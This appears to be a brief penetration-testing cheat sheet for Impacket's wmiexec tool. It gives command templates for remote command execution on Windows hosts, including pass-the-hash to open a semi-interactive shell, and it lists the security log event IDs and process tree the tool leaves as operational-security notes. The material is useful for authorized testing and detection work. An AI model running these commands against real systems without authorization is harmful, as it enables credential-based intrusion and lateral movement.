### source
https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py  

### executes single command
```
impacket-wmiexec <domain>/<user>:<password>@<rhost> <command>
```

### use hashes and launch semi interactive powershell
```
impacket-wmiexec -hashes :<ntlmHash> <domain>/<user>@<rhost>
```

### opsec considerations - Windows Security Log Event IDs
```
-Logon (4624) -> multiple
-Special Logon (4672) -> multiple
```

### running processes
```
wininit.exe
└── services.exe
    └── svchost.exe
        └── wmiprvse.exe
            └── cmd.exe
                └── Conhost.exe
```

